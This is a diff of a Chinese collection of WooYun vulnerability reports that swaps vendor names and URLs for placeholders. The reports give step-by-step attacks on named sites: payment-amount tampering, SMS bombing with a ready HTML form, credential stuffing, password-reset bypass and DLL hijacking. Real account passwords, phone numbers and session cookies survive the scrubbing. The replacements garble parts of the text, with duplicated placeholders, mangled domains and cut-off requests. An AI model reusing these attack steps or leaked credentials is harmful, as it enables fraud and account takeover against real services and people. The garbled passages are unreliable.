+**详情**: 问题出在有菜 某互联网公司端首先我们看下商户信息然后抓包GET /api/supplier/2792 HTTP/1.1Host: youcai.ele.meAccept-Encoding: gzip, deflateCookie: _utrace=c8456e60386614d292486c081b713c10_2015-10-13; eleme__ele_me=f5392406e563495e23b77fefe7e2d099%3A7deebd27579661558aa60ff03882f47a47b5733a; track_id=1444666918%7Ccd7c60baeac69b4cfd36667853b4efd0990137340c68e6f9f0%7C4621431fe41c60df1fb5c396d1ea5f7b; ubt_ssid=yz8zt80frn2fw1epek29ymoq3g
 
 **POC**: (见原文)
 
@@ -19057,8 +19057,8 @@
 ---
 
 ---
-### [wooyun-2014-060356] 微博某业务40000多元的产品瞬间变1元支付（支付漏洞）
-**厂商**: 新浪微博 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2014-060356] 某社交平台某业务40000多元的产品瞬间变1元支付（支付漏洞）
+**厂商**: 某社交平台某社交平台 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 认证接口
 
@@ -19069,7 +19069,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 目标站点：http://ketang.weibo.com/登陆之后我们来到首页选一门课程比如就选第二个吧。。点击进去之后选择立即购买，看看价格 46900元 啊，好贵啊，能便宜点吗。。到这个页面了点击在线支付之后会出现一个确认支付如图就在这里我们开始抓包吧看看抓到的内容发现其实最后一项内容就是价格，我们改成1看看会怎么样之后提交哈哈看到了吗，40000多元的课程变成了一元钱，超值啊剩下我们只需要用支付宝支付一下即可，由于身边没有支付宝，就不演示了。。
+**详情**: 目标站点：https://example.com/[已脱敏] 46900元 啊，好贵啊，能便宜点吗。。到这个页面了点击在线支付之后会出现一个确认支付如图就在这里我们开始抓包吧看看抓到的内容发现其实最后一项内容就是价格，我们改成1看看会怎么样之后提交哈哈看到了吗，40000多元的课程变成了一元钱，超值啊剩下我们只需要用某电商平台支付一下即可，由于身边没有某电商平台，就不演示了。。
 
 **POC**: 扣费成功证明购买成功证明
 
@@ -19113,7 +19113,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.7caihua.com/在提交订单处。如下图在提交的时候修改数据包修改成以下数据来测试，全是0.01订单的时候直接显示0元了。。。在来看一个例子没去支付。应该没有问题的
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 如上
 
@@ -19157,7 +19157,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 金蝶做医疗了，看流程确实很方便，微信挂号直接就诊，其它平台预约后，就诊当天还要去排队挂号，而且交费也不用排队哦。http://yiliao.kingdee.com/http://www.mhealth100.com/ip-pat-mgr-web/!index.do广东有很多医院开始用了。然后我就扫了一下码，回家看看。通过微信号直接预约发现个支付漏洞，可以随便修改挂号费。
+**详情**: 金蝶做医疗了，看流程确实很方便，某互联网公司挂号直接就诊，其它平台预约后，就诊当天还要去排队挂号，而且交费也不用排队哦。https://example.com/[已脱敏]
 
 **POC**: 预约挂号，先选择科室，再选择医生，正常价格是22元在下一步提交的时候修改价格，fee=0.01&treatfee=0.1 这两个参数已支付成功
 
@@ -19277,8 +19277,8 @@
 ---
 
 ---
-### [wooyun-2013-018243] 淘宝网一处业务设计逻辑漏洞可导致欺诈成功
-**厂商**: 淘宝网 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2013-018243] 某电商平台网一处业务设计逻辑漏洞可导致欺诈成功
+**厂商**: 某电商平台网 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -19289,7 +19289,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 大概的流程如下买家A在淘宝网上购买了卖家B的商品，进而发现卖家B没有发货或者是其他原因，A申请退款，B可以立即拒绝，这个时候，卖家立即拒绝（经过试验可以用程序自动拒绝，漏洞！），而买家A只有3天的时间（这个时间是从发起退款申请那一刻计算的）来处理卖家拒绝的退款申请。但是，淘宝客服介入也是三天时间，而淘宝还有一条规定是，当卖家拒绝退款申请的时候“卖家没有接受申请，请您及时处理，逾期将自动撤销申请。”，这个时间也是3天，理论上是同一个时间的，也就是说你如果没有在三天内进行处理，那么这个申请也会被撤销。如果卖家一直拒绝，那么就会导致一个“退款申请逾期”的问题，导致客服介入之前就“逾期”了。
+**详情**: 大概的流程如下买家A在某电商平台网上购买了卖家B的商品，进而发现卖家B没有发货或者是其他原因，A申请退款，B可以立即拒绝，这个时候，卖家立即拒绝（经过试验可以用程序自动拒绝，漏洞！），而买家A只有3天的时间（这个时间是从发起退款申请那一刻计算的）来处理卖家拒绝的退款申请。但是，某电商平台客服介入也是三天时间，而某电商平台还有一条规定是，当卖家拒绝退款申请的时候“卖家没有接受申请，请您及时处理，逾期将自动撤销申请。”，这个时间也是3天，理论上是同一个时间的，也就是说你如果没有在三天内进行处理，那么这个申请也会被撤销。如果卖家一直拒绝，那么就会导致一个“退款申请逾期”的问题，导致客服介入之前就“逾期”了。
 
 **POC**: (见原文)
 
@@ -19387,8 +19387,8 @@
 ---
 
 ---
-### [wooyun-2014-072593] 中国电信某分站支付漏洞(已成功)
-**厂商**: 中国电信 | **年份**: 2014 | **类型**: 网络设计缺陷/逻辑错误
+### [wooyun-2014-072593] 某运营商某分站支付漏洞(已成功)
+**厂商**: 某运营商 | **年份**: 2014 | **类型**: 网络设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -19443,7 +19443,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 快递注册这里：http://m.wochacha.com/e/register发送短信频率和数量没有做限制，导致可以对别人进行短信轰炸发送接口：GET http://m.wochacha.com/e/register?gcsid=32e0a****隐藏若干位***3af12184&phone=180********9&s=确认
+**详情**: 快递注册这里：https://example.com/[已脱敏] https://example.com/[已脱敏]
 
 **POC**: 手机截图麻烦，不弄了
 
@@ -19487,7 +19487,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.这是由于官方忽略漏洞导致的:WooYun: TCL某站弱口令导致5000+员工信息暴露(姓名/工号/身份证/电话/邮箱/专业/职位等...)最下面有这张图片可以看到邮箱用户名为 lexue@tcl.com密码为 1qazXSW@2.尝试登录此邮箱地址 https://mail.tcl.com/owa/登录成功！3.来到内部员工直销平台http://ego.tcl.com.cn/DRP/登录不上，必须先注册一个注册的用户名和密码同邮箱成功登录4.购买电器的价格参数可修改选几样添加到购物车这时打开burp抓包，点击结算，抓包内容如下POST /DRP/shopping/toBalanceShoppingCart HTTP/1.1Host: ego.tcl.com.cnUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:40.0) Gec
+**详情**: 1.这是由于官方忽略漏洞导致的:WooYun: TCL某站弱口令导致5000+员工信息暴露(姓名/工号/身份证/电话/邮箱/专业/职位等...)最下面有这张图片可以看到邮箱用户名为 lexue@tcl.com密码为 1qazXSW@2.尝试登录此邮箱地址 https://example.com/[已脱敏] /DRP/shopping/toBalanceShoppingCart HTTP/1.1Host: ego.tcl.com.cnUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:40.0) Gec
 
 **POC**: 见详细说明
 
@@ -19509,7 +19509,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 班班网是一家discuz教程为主的在线教程网站，vip收费要好几千块钱，不小心获取到vip视频了。班班网用的是极酷阳光播放器，打开一个免费视频用谷歌浏览器查看network视频加载发现免费教程视频路径http://www.banban.so/data/attachment/v/bbtuploaducanneverimagine/2015091501.mp4打开一个vip视频教程发现路径http://www.banban.so/data/attachment/vpreview/vyulanbbt/059.mp4右键源代码可以看到播放器的js代码，记住FlvID=XXX极酷阳光播放器有个文件/Player/CuSunV2Set.php打开www.banban.so/player/CuSunV2set.php?FlvID=444右键查看源代码可以看到视频的真实路径啦下面写了个php自动扫描获取的
+**详情**: 班班网是一家discuz教程为主的在线教程网站，vip收费要好几千块钱，不小心获取到vip视频了。班班网用的是极酷阳光播放器，打开一个免费视频用谷歌浏览器查看network视频加载发现免费教程视频路径https://example.com/[已脱敏]
 
 **POC**: 这个就是批量获取到的vip视频地址啦
 
@@ -19541,8 +19541,8 @@
 ---
 
 ---
-### [wooyun-2014-067720] 支付宝转存存在逻辑漏洞
-**厂商**: 支付宝 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2014-067720] 某电商平台转存存在逻辑漏洞
+**厂商**: 某电商平台 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -19553,7 +19553,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 发现这个漏洞的经过是这样的，昨天我从淘宝上买了件东西，卖家退了10元到了我的支付宝账号里去了，然后我想把退的这10元钱转到银行卡里去，于是我打开支付宝转钱。大家都知道转钱需要一定的时间，在这个时间里我去了卡盟 ，想开个会员，但是卡盟里已经没钱了，我又用支付宝向卡盟里存钱，发现支付宝里的10元还在，于是用这10元往卡盟里存了12元。直到今天我打开农业银行的网址想看看还剩余多少钱，当我打开明细的时候发现昨天的10元钱转到银行卡里去了，但卡盟的钱依然还在。今天我不相信又试了一次，试了2元，但结果和昨天一样。这样有盗钱危险！
+**详情**: 发现这个漏洞的经过是这样的，昨天我从某电商平台上买了件东西，卖家退了10元到了我的某电商平台账号里去了，然后我想把退的这10元钱转到银行卡里去，于是我打开某电商平台转钱。大家都知道转钱需要一定的时间，在这个时间里我去了卡盟 ，想开个会员，但是卡盟里已经没钱了，我又用某电商平台向卡盟里存钱，发现某电商平台里的10元还在，于是用这10元往卡盟里存了12元。直到今天我打开农业银行的网址想看看还剩余多少钱，当我打开明细的时候发现昨天的10元钱转到银行卡里去了，但卡盟的钱依然还在。今天我不相信又试了一次，试了2元，但结果和昨天一样。这样有盗钱危险！
 
 **POC**: (见原文)
 
@@ -19575,7 +19575,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 优酷土豆第三方素材替换平台：http://211.151.146.175:8080/login.do存在逻辑缺陷，导致被攻击者轻易攻破。1. 验证码可绕过这是很多公司外网暴露的系统存在的通病，看起来有验证码，实际多数都可绕过、可逆向、可识别。此站点，固定Cookie中JSESSIONID和参数code的值，即可进行暴力破解。2. 提示信息过详细不存在的用户和存在的用户，提示不一样，攻击者轻易猜解出哪些用户是存在的。（指数级减小了破解尝试次数）此处存在的用户，提示“用户名或密码错误，请重新输入”不存在的用户，则提示“您没有该系统权限，请联系管理员！”挂个小字典，很快即可小范围锁定用户名列表，我跑出来少量用户：adminjintuotudouyoukuzhousu利用密码字典再跑一遍，命中用户：tudou，密码tudou123456youku, 密码youku888
+**详情**: 优酷土豆第三方素材替换平台：http://[IP已脱敏] 验证码可绕过这是很多公司外网暴露的系统存在的通病，看起来有验证码，实际多数都可绕过、可逆向、可识别。此站点，固定Cookie中JSESSIONID和参数code的值，即可进行暴力破解。2. 提示信息过详细不存在的用户和存在的用户，提示不一样，攻击者轻易猜解出哪些用户是存在的。（指数级减小了破解尝试次数）此处存在的用户，提示“用户名或密码错误，请重新输入”不存在的用户，则提示“您没有该系统权限，请联系管理员！”挂个小字典，很快即可小范围锁定用户名列表，我跑出来少量用户：adminjintuotudouyoukuzhousu利用密码字典再跑一遍，命中用户：tudou，密码tudou123456youku, 密码youku888
 
 **POC**: (见原文)
 
@@ -19641,7 +19641,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.老规矩，站点如下：http://www.51greenorange.com2.还是看俺如何一步一步购买的吧！先买个Mars1升级版小绿，￥599啊，这么便宜呢！3.加入到购物车，嗯！这里是需要599元的哦。然后点继续购物啦！
+**详情**: 1.老规矩，站点如下：https://example.com/[已脱敏]
 
 **POC**: 4.买个便宜的吧，Mars1白色，只需499元，更便宜啦！加入到购物车：5.这个时候，加上代理，操上burp suite，看下支付的数据，这里是GET方式提交给服务器的，抓包如下GET /addtocart.aspx?qty=1&pid=1427&color=%u82F9%u679C%u7EFF HTTP/1.1这里当然pid应该是商品的编号，服务端根据这个pid，从数据库中查询出价格，所以这里确实是改不掉金额了。不过话说是不是可以改成其他的pid呢？qty是购买手机的个数。这里改成-1啦！如下6.看看购物车里面的情况吧！7.点击确认结账了，生成的最终订单只需110元哦，这个数字不吉利啊！我不
 
@@ -19685,7 +19685,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 先进入找回密码界面。http://port.okwei.com/FindPassword.aspx我这里在网上搜索的，发现18583237722的手机号注册过微店网。一步一步来，填写手机。然后开始抓包。先输入验证码。之后抓到以下数据包。在这段数据包里把手机号码改成你的手机，稍后验证码就发送过来了。输入完验证码后，点击下一步。抓到以下数据包。这时还要把你的电话号码改成你的手机号。接下来就不用抓包了，直接修改密码，成功！
+**详情**: 先进入找回密码界面。https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -19707,9 +19707,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 由于微电聊对微信绑定手机这一注册过程未做严格的业务逻辑处理，导致微信帐号可绑定任意手机号，从而造成服务滥用。1.这是一个业务逻辑问题；2.漏洞可被利用作为骚扰电话，让通讯双方都崩溃；3.也可以帮微电聊迅速烧钱；
+**详情**: 由于微电聊对某互联网公司绑定手机这一注册过程未做严格的业务逻辑处理，导致某互联网公司帐号可绑定任意手机号，从而造成服务滥用。1.这是一个业务逻辑问题；2.漏洞可被利用作为骚扰电话，让通讯双方都崩溃；3.也可以帮微电聊迅速烧钱；
 
-**POC**: 1.微信用户A，发送指令zc18411111111到 微电聊 公众号进行注册；2.回复微电聊189222222223.微电聊会呼叫18411111111，接通后，继续呼叫18922222222Nokia1050，没法截图。4.18411111111和18922222222可以正常通话了
+**POC**: 1.某互联网公司用户A，发送指令zc18411111111到 微电聊 公众号进行注册；2.回复微电聊189222222223.微电聊会呼叫18411111111，接通后，继续呼叫18922222222Nokia1050，没法截图。4.18411111111和18922222222可以正常通话了
 
 **绕过**: 直接利用
 
@@ -19773,9 +19773,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 湖南大学网上办公系统：http://oa.hnu.cn/burp抓包咯爆破咯你们懂的咯
+**详情**: 湖南大学网上办公系统：https://example.com/[已脱敏]
 
-**POC**: 抓数据包：POST /Home/Login HTTP/1.1Host: oa.hnu.cnContent-Length: 30Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://oa.hnu.cnUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like
+**POC**: 抓数据包：POST /Home/Login HTTP/1.1Host: oa.hnu.cnContent-Length: 30Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: https://example.com/[已脱敏] 1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like
 
 **绕过**: 直接利用
 
@@ -19797,7 +19797,7 @@
 
 **详情**: 先对自身账号进行一下抓包一：查看用户信息二：修改用户资料三：修改登录密码
 
-**POC**: 从抓包信息可以看出，缺乏有力的验证手段。对post的数据包进行修改，可以成功查看/更改其他账户的信息。查看任意用户信息姓名 学号 QQ 邮箱 手机号等一览无余修改任意用户资料用户资料成功被重置！修改任意用户密码这里是拿自己的账号做的测试执行后，用原密码已无法登陆，密码重置成功！
+**POC**: 从抓包信息可以看出，缺乏有力的验证手段。对post的数据包进行修改，可以成功查看/更改其他账户的信息。查看任意用户信息姓名 学号 某互联网公司 邮箱 手机号等一览无余修改任意用户资料用户资料成功被重置！修改任意用户密码这里是拿自己的账号做的测试执行后，用原密码已无法登陆，密码重置成功！
 
 **绕过**: 直接利用
 
@@ -19839,9 +19839,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 微信商场存在问题http://wechat.zhiwo.com/
+**详情**: 某互联网公司商场存在问题https://example.com/[已脱敏]
 
-**POC**: 1.登陆微信2.关注 zwyzsc3.下单抓包
+**POC**: 1.登陆某互联网公司2.关注 zwyzsc3.下单抓包
 
 **绕过**: 直接利用
 
@@ -19861,7 +19861,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.zteclouds.cn,中兴云服务：注册账号后，登陆进入充值页面，这里选择我用的招行（支付宝的接口好像有问题，支付不了，只能银行了），充值金额100，然后点充值：然后到银行充值页面后，直接关闭页面再回来，点充值成功，在充值页面发现生成了订单，金额是100，可以继续完成充值：这个时候到继续支付页面，金额我们改成0.01，再完成整个支付过程：支付完成0.01，我手机支付的：回来就发现账户余额是100了：
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 同上
 
@@ -19905,7 +19905,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.ccbooknet.com数量可以随意修改哟！变成负数了。
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 很显然，金额是不对滴～
 
@@ -19937,8 +19937,8 @@
 ---
 
 ---
-### [wooyun-2013-023789] 阿里云计算按量付费逻辑漏洞一枚（低价享受超级主机）
-**厂商**: 阿里巴巴 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2013-023789] 某电商平台计算按量付费逻辑漏洞一枚（低价享受超级主机）
+**厂商**: 某电商平台 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -19949,7 +19949,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 看图我可以求个工作么（微博 @蓝小灰想换工作 ）？
+**详情**: 看图我可以求个工作么（某社交平台 @蓝小灰想换工作 ）？
 
 **POC**: 而同等配置的包月计费需要2W余元。
 
@@ -19973,7 +19973,7 @@
 
 **详情**: 名称：特急送敏感信息泄露漏洞异常或问题描述：由于逻辑设计缺陷，可悲非授权访问，不法分子可以利用撞库等手段轻松获取其客户及员工的敏感信息甚至泄露客户商业机密。涉及范围：辽宁特急送员工及客户异常解决措施：订单查询输入验证码，增加随即查询密码，订单编号印制的时候采取随即不重复数列取代现有连续编号。异常验证测试记录：通过攻击代码：无攻击复杂度：低认证：无机密性：完全地完整性：无可用性：误具体问题见漏洞证明截图
 
-**POC**: http://lntjs.vicp.net/query.asp注意这里每个单子至少有一个扫描件点开得到如下详细信息订单印制问题
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -20037,9 +20037,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.17sucai.com/pins/10990.htmlhttp://www.17sucai.com/preview/177696/2015-06-21/%E8%92%B2%E5%85%AC%E8%8B%B11/index.html感觉这个很不错，想下载下来的，然后没积分，测试了一下撞库，发现是有撞库漏洞的：http://www.17sucai.com/pins/10990.html登录的位置没有验证码限制，用户名密码均为明文传输：然后测试了一下撞库，发现成功帐号：登录帐号查看：
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://www.17sucai.com/pins/10990.htmlhttp://www.17sucai.com/preview/177696/2015-06-21/%E8%92%B2%E5%85%AC%E8%8B%B11/index.html感觉这个很不错，想下载下来的，然后没积分，测试了一下撞库，发现是有撞库漏洞的：http://www.17sucai.com/pins/10990.html登录的位置没有验证码限制，用户名密码均为明文传输：然后测试了一下撞库，发现成功帐号：登录帐号查看：
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -20047,8 +20047,8 @@
 ---
 
 ---
-### [wooyun-2012-07876] 淘宝应用iphone设计缺陷可无限制猜试密码
-**厂商**: 淘宝网 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2012-07876] 某电商平台应用iphone设计缺陷可无限制猜试密码
+**厂商**: 某电商平台网 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 认证接口
 
@@ -20091,8 +20091,8 @@
 ---
 
 ---
-### [wooyun-2014-075505] 中秋快乐#百度旗下某站支付漏洞一枚
-**厂商**: 百度 | **年份**: 2014 | **类型**: 系统/服务运维配置不当
+### [wooyun-2014-075505] 中秋快乐#某搜索引擎旗下某站支付漏洞一枚
+**厂商**: 某搜索引擎 | **年份**: 2014 | **类型**: 系统/服务运维配置不当
 
 **元思考**: 触发信号: 参数注入
 
@@ -20103,9 +20103,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 我们先看下任然是我大百度花了3000万美元收购的传课网由于我经常看av，对护士这种东西非常敏感http://www.chuanke.com/1440953-99413.html呵呵2014护士考前冲刺班——妇科价格：200.00 元总课时：8课时 结束时间：2015年4月8日 担保期：15天妇科，好想要Lu一炮我买下它，但是200块钱，我看快播充个VIP也不用那么多啊，汗https://pay.chuanke.com/st/PrePay?r=1410187027纳尼，跳到这里了但是又受不了诱惑，我就在想，能不能1块钱把它买了我还以为是百度那边自己开发的支付中心，原来这个只是提交了订单，并不是让我付款，跳来跳去的= =好的，我们抓包fromPay=fromPay&p5_Pid=189837992%40qq.com&p3_Amt=200.00&bankId=alipay呵呵，一块钱就好啦，p3
+**详情**: 我们先看下任然是我大某搜索引擎花了3000万美元收购的传课网由于我经常看av，对护士这种东西非常敏感https://example.com/[已脱敏] 元总课时：8课时 结束时间：2015年4月8日 担保期：15天妇科，好想要Lu一炮我买下它，但是200块钱，我看快播充个VIP也不用那么多啊，汗https://example.com/[已脱敏] =好的，我们抓包fromPay=fromPay&p5_Pid=189837992%40某互联网公司.com&p3_Amt=200.00&bankId=alipay呵呵，一块钱就好啦，p3
 
-**POC**: 我们先看下任然是我大百度花了3000万美元收购的传课网由于我经常看av，对护士这种东西非常敏感http://www.chuanke.com/1440953-99413.html呵呵2014护士考前冲刺班——妇科价格：200.00 元总课时：8课时 结束时间：2015年4月8日 担保期：15天妇科，好想要Lu一炮我买下它，但是200块钱，我看快播充个VIP也不用那么多啊，汗https://pay.chuanke.com/st/PrePay?r=1410187027纳尼，跳到这里了但是又受不了诱惑，我就在想，能不能1块钱把它买了我还以为是百度那边自己开发的支付中心，原来这个只是提交了订单，并不是让
+**POC**: 我们先看下任然是我大某搜索引擎花了3000万美元收购的传课网由于我经常看av，对护士这种东西非常敏感https://example.com/[已脱敏] 元总课时：8课时 结束时间：2015年4月8日 担保期：15天妇科，好想要Lu一炮我买下它，但是200块钱，我看快播充个VIP也不用那么多啊，汗https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -20136,7 +20136,7 @@
 
 ---
 ### [wooyun-2013-035437] 易信某短信下发接口限制不当可对手机进行短信轰炸
-**厂商**: 网易 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -20147,7 +20147,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 短信接口泄漏 得到的用户可以利用这个漏洞给任何手机发送短信  对于厂商危害性不大  对于我们来说不小 谁都不想自己的手机号乱收短信 希望厂家能修复<form action="http://yixin.im/api/dlfromsms" method="post"><input type="text" value="" name="mobile" /><input type="submit" value="OK" /></form>新建一个文本把上面代码复制进去 保存后缀改成xxx.html打开 输入框输入手机号点击OK就可以发送短信了 刷新一次发送一次
+**详情**: 短信接口泄漏 得到的用户可以利用这个漏洞给任何手机发送短信  对于厂商危害性不大  对于我们来说不小 谁都不想自己的手机号乱收短信 希望厂家能修复<form action="https://example.com/[已脱敏]" method="post"><input type="text" value="" name="mobile" /><input type="submit" value="OK" /></form>新建一个文本把上面代码复制进去 保存后缀改成xxx.html打开 输入框输入手机号点击OK就可以发送短信了 刷新一次发送一次
 
 **POC**: (见原文)
 
@@ -20213,7 +20213,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://westsecu.21tb.com/login/login.logout.do原始：绕过：成功：
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -20257,7 +20257,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://m.m.58.com/reg/?from=index_reg在这里输入手机号后获取短信，抓包看看直接post即可实现短信轰炸
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 如上。
 
@@ -20267,8 +20267,8 @@
 ---
 
 ---
-### [wooyun-2013-026393] 新浪微博会员购买存支付漏洞
-**厂商**: 新浪 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2013-026393] 某社交平台某社交平台会员购买存支付漏洞
+**厂商**: 某社交平台 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -20279,7 +20279,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 支付的时候选择支付宝方式，把month改为0.001 到支付宝那边就变成1分钱，支付后会员开通成功。
+**详情**: 支付的时候选择某电商平台方式，把month改为0.001 到某电商平台那边就变成1分钱，支付后会员开通成功。
 
 **POC**: (见原文)
 
@@ -20303,7 +20303,7 @@
 
 **详情**: 
 
-**POC**: 也就修改下支付金额的value即可，涉及的网站蛮多103个网站以上 具体哪些网站。存在漏洞网站地址 http://www.booioo.com/case.html 里面网站基本都存在这漏洞 算不算通用？
+**POC**: 也就修改下支付金额的value即可，涉及的网站蛮多103个网站以上 具体哪些网站。存在漏洞网站地址 https://example.com/[已脱敏] 里面网站基本都存在这漏洞 算不算通用？
 
 **绕过**: 直接利用
 
@@ -20311,8 +20311,8 @@
 ---
 
 ---
-### [wooyun-2012-05850] QQ网盘信息泄漏！
-**厂商**: 腾讯 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2012-05850] 某互联网公司网盘信息泄漏！
+**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 认证接口
 
@@ -20323,9 +20323,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 用过QQ网盘的人都知道，如果设置在QQ网盘上设置密码之后，每次启动QQ网盘是需要输入密码才可以进入的。但是，如果用手机管家（因为一般都设置了自动登录，无需再输入QQ密码），直接就可以读取到网盘的信息。危害：如果手机丢失，坏淫们会读取到你QQ网盘内存放的各种密码、看到各种妹子照片等等。。
+**详情**: 用过某互联网公司网盘的人都知道，如果设置在某互联网公司网盘上设置密码之后，每次启动某互联网公司网盘是需要输入密码才可以进入的。但是，如果用手机管家（因为一般都设置了自动登录，无需再输入某互联网公司密码），直接就可以读取到网盘的信息。危害：如果手机丢失，坏淫们会读取到你某互联网公司网盘内存放的各种密码、看到各种妹子照片等等。。
 
-**POC**: 1、启动手机管家2、进入QQ网盘
+**POC**: 1、启动手机管家2、进入某互联网公司网盘
 
 **绕过**: 直接利用
 
@@ -20367,7 +20367,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 漏洞地址：http://www.fangte.com/ticket/这里没有验证码的限制，我们来撞库下
+**详情**: 漏洞地址：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -20399,8 +20399,8 @@
 ---
 
 ---
-### [wooyun-2013-035197] QQ游戏 DLL劫持漏洞
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2013-035197] 某互联网公司游戏 DLL劫持漏洞
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -20411,7 +20411,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 测试版本：3.1.104.52具体利用方法：假如QQ游戏安装在C盘劫持路径：C:\Program Files\Tencent\QQGame\QQGame.exe运行时会加载一个不存在的DLL文件dwmapi.dll，只要自己写一个dwmapi.dll与QQGame.exe放在同一目录，这样就可以在运行QQGame.exe的时候会同时加载dwmapi.dll，这个dwmapi.dll可以为自制的任意恶意dll。此方法可用于劫持启动木马病毒。（我这里放入特定的dll后，运行QQGame.exe会弹出一个特定的框显示"Hello from MyDLL!"，如下图）当时劫持时使用的DLL下载地址：密码58n6http://pan.baidu.com/share/link?shareid=172262024&uk=4164057933
+**详情**: 测试版本：[IP已脱敏]具体利用方法：假如某互联网公司游戏安装在C盘劫持路径：C:\Program Files\Tencent\某互联网公司Game\某互联网公司Game.exe运行时会加载一个不存在的DLL文件dwmapi.dll，只要自己写一个dwmapi.dll与某互联网公司Game.exe放在同一目录，这样就可以在运行某互联网公司Game.exe的时候会同时加载dwmapi.dll，这个dwmapi.dll可以为自制的任意恶意dll。此方法可用于劫持启动木马病毒。（我这里放入特定的dll后，运行某互联网公司Game.exe会弹出一个特定的框显示"Hello from MyDLL!"，如下图）当时劫持时使用的DLL下载地址：密码58n6https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -20455,7 +20455,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 安全问题：财智魔方任意账户密码重置复现步骤：http://www.caizhimofang.com/Home/Index/findpwdPhone1.在相同浏览器下开两个窗口，打开上面链接2.正常输入自己的手机号、验证码，跳转到修改密码页面停住，不在操作3.切到第二个窗口，输入要攻击的手机，点击发送验证码，验证码我们肯定不知道4.且到第2步的修改密码页面，输入密码，OK了，攻击的手机号的账号密码已成功修改
+**详情**: 安全问题：财智魔方任意账户密码重置复现步骤：https://example.com/[已脱敏]
 
 **POC**: 找个手机号吧中间4位打码难不倒我吖：18618117600  密码：gaimimaya ，说好的一千两百万呢应该指的是流水一千多万吧周排名第二的人：13521662930  密码：gaimimaya ，说好的两百万呢
 
@@ -20501,7 +20501,7 @@
 
